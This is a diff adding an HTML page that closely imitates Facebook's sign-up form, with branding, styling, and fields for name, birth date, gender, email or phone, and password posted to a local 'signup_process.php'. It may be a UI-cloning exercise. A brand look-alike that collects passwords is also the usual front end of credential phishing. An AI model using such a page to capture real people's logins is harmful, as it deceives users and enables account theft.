@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Sign Up</title>
+    <link rel="icon" href="fbook.png" type="image/png">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+        }
+        .facebook-logo {
+            font-size: 48px;
+            font-weight: bold;
+            color: #1877f2;
+            margin-bottom: 10px;
+        }
+        .signup-box {
+            background: white;
+            padding: 20px;
+            width: 400px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
+            text-align: center;
+        }
+        .signup-box h2 {
+            margin: 0;
+            font-size: 24px;
+            font-weight: bold;
+        }
+        .signup-box p {
+            color: gray;
+            font-size: 14px;
+        }
+        .input-group {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 10px;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 14px;
+        }
+        select {
+            width: 32%;
+            padding: 8px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 14px;
+        }
+        .gender-group {
+            display: flex;
+            justify-content: flex-end;
+            margin-bottom: 10px;
+            gap: 10px;
+        }
+        .gender-group label {
+            width: 32%;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            padding: 8px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            font-size: 14px;
+        }
+        .gender-group input {
+            margin-left: 5px;
+        }
+        .gender-group label:hover {
+            background-color: #f0f0f0;
+        }
+        .pronoun-container, .gender-input-container {
+            display: none;
+            margin-top: 10px;
+            text-align: left;
+        }
+        .pronoun-container select, .gender-input-container input {
+            width: 100%;
+        }
+        .terms {
+            font-size: 12px;
+            color: gray;
+            margin-top: 10px;
+            text-align: left;
+        }
+        .signup-button {
+            background: #42b72a;
+            color: white;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            width: 60%;
+            margin-top: 10px;
+           
+            margin-left: 9px;
+        }
+        .signup-button:hover {
+            background: #36a420;
+        }
+        .login-link {
+            margin-top: 10px;
+            font-size: 14px;
+        }
+        .login-link a {
+            color: #1877f2;;
+            text-decoration: none;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="facebook-logo">facebook</div>
+    
+    <div class="signup-box">
+        <h2>Create a new account</h2>
+        <p>It's quick and easy.</p>
+    
+        <form action="signup_process.php" method="POST">
+            <div class="input-group">
+                <input type="text" name="first_name" placeholder="First name" required>
+                <input type="text" name="surname" placeholder="Surname" required>
+            </div>
+    
+            <label style="display: block; text-align: left; font-size: 12px; color: gray;">Date of birth</label>
+            <div class="input-group">
+                <select name="day">
+                    <option>11</option>
+                    <option>12</option>
+                    <option>13</option>
+                </select>
+                <select name="month">
+                    <option>Feb</option>
+                    <option>Mar</option>
+                    <option>Apr</option>
+                </select>
+                <select name="year">
+                    <option>2025</option>
+                    <option>2024</option>
+                    <option>2023</option>
+                </select>
+            </div>
+    
+            <label style="display: block; text-align: left; font-size: 12px; color: gray;">Gender</label>
+            <div class="gender-group">
+                <label>Female<input type="radio" name="gender" value="female" onclick="togglePronoun()"> </label>
+                <label> Male<input type="radio" name="gender" value="male" onclick="togglePronoun()"> </label>
+                <label>Custom<input type="radio" name="gender" value="custom" onclick="togglePronoun()"> </label>
+            </div>
+    
+            <div class="pronoun-container" id="pronoun-container">
+                <label style="display: block; font-size: 12px; color: gray;">Select Pronoun</label>
+                <select name="pronoun" id="pronoun-select">
+                    <option value="she">She: "Wish her happy birthday"</option>
+                    <option value="he">He: "Wish him happy birthday"</option>
+                    <option value="they">They: "Wish them happy birthday"</option>
+                </select>
+            </div>
+    
+            <div class="gender-input-container" id="gender-input-container">
+                <label style="display: block; font-size: 12px; color: gray;">Please specify your gender (optional)</label>
+                <input type="text" name="custom_gender" id="custom-gender" placeholder="Enter your gender" />
+            </div>
+    
+            <input type="email" name="email" placeholder="Mobile number or email address" style="width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #ccc; border-radius: 5px; font-size: 14px;" required>
+            <input type="password" name="password" placeholder="New password" style="width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #ccc; border-radius: 5px; font-size: 14px;" required>
+    
+            <p class="terms">
+                People who use our service may have uploaded your contact information to Facebook. <a href="#">Learn more</a>.
+            </p>
+            <p class="terms">
+                By clicking Sign Up, you agree to our <a href="#">Terms</a>, <a href="#">Privacy Policy</a>, and <a href="#">Cookies Policy</a>. You may receive SMS notifications from us and can opt out at any time.
+            </p>
+    
+            <button class="signup-button" type="submit">Sign Up</button>
+        </form>
+    
+        <p class="login-link">Already have an account? <a href="facebook_login.php">Log in</a></p>
+    </div>
+    
+    <script>
+        function togglePronoun() {
+            var gender = document.querySelector('input[name="gender"]:checked') ? document.querySelector('input[name="gender"]:checked').value : '';
+            var pronounContainer = document.getElementById("pronoun-container");
+    
+            if (gender === "custom") {
+                pronounContainer.style.display = "block";
+            } else {
+                pronounContainer.style.display = "none";
+            }
+        }
+    </script>
+    
+    </body>
+    </html>
